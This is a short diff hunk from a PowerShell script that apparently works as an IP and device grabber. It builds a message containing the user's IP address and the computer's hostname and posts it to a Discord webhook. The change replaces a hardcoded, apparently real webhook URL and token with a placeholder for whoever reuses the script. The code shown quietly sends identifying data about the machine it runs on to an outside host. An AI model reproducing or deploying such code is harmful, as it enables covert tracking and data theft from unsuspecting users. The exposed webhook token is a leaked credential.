@@ -21,7 +21,7 @@ try {
 }
 
 $deviceName = hostname
-$webhookURL = 'https://discord.com/api/webhooks/1191459688500428881/hJgmB79RWcF1iTAnZLTybfOXo8mGvy-XbIKgUut8qkLUvsuiP5cXPGtiGoy5NrPH6PX0'
+$webhookURL = 'PUT YOUR DISCORD WEBHOOK URL HERE'
 $message = "User's IP: $ip`nDevice Name: $deviceName"
 
 SendToWebhook $webhookURL $message
